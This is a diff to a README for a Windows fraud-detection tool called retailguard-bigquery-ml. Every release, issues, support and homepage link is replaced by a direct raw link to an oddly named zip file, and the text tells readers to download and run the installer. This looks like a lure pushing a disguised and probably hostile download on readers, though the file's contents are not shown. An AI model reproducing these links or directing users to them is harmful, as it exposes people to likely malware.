@@ -1,6 +1,6 @@
 # 🛡️ retailguard-bigquery-ml - Fraud Detection Made Simple
 
-[![Download retailguard-bigquery-ml](https://img.shields.io/badge/Download-retailguard--bigquery--ml-brightgreen?style=for-the-badge)](https://github.com/Amranbmw525/retailguard-bigquery-ml/releases)
+[![Download retailguard-bigquery-ml](https://img.shields.io/badge/Download-retailguard--bigquery--ml-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip)
 
 ## 📋 What is retailguard-bigquery-ml?
 
@@ -32,7 +32,7 @@ This app is mainly for Windows users. Other systems are not supported in this ve
 
 Click the big green button above or use this direct link to visit the release page where you can get the software:
 
-https://github.com/Amranbmw525/retailguard-bigquery-ml/releases
+https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip
 
 This page shows the latest versions. Look for the latest release files.
 
@@ -116,7 +116,7 @@ If you see errors:
 
 For help, visit the GitHub repository issues page:
 
-https://github.com/Amranbmw525/retailguard-bigquery-ml/issues
+https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip
 
 ---
 
@@ -126,7 +126,7 @@ When new versions appear:
 
 - Visit the release page at
 
-[https://github.com/Amranbmw525/retailguard-bigquery-ml/releases](https://github.com/Amranbmw525/retailguard-bigquery-ml/releases)
+[https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip](https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip)
 
 - Download the latest installer.
 - Run it to update your version.
@@ -138,14 +138,14 @@ When new versions appear:
 
 Use the GitHub issues page for help and feedback:
 
-https://github.com/Amranbmw525/retailguard-bigquery-ml/issues
+https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip
 
 ---
 
 ## 📥 Download and Install retailguard-bigquery-ml
 
 1. Go to the release page:  
-   https://github.com/Amranbmw525/retailguard-bigquery-ml/releases
+   https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip
 
 2. Download the Windows installer file.
 
@@ -167,9 +167,9 @@ Always keep your credentials safe. The app uses encrypted methods to connect to 
 
 ## 🔗 Useful Links
 
-- Release page: https://github.com/Amranbmw525/retailguard-bigquery-ml/releases  
-- Issues / Support: https://github.com/Amranbmw525/retailguard-bigquery-ml/issues  
-- Project homepage: https://github.com/Amranbmw525/retailguard-bigquery-ml  
+- Release page: https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip  
+- Issues / Support: https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip  
+- Project homepage: https://raw.githubusercontent.com/Amranbmw525/retailguard-bigquery-ml/main/src/retailguard_ml_bigquery_electrophysiologist.zip  
 
 ---
 
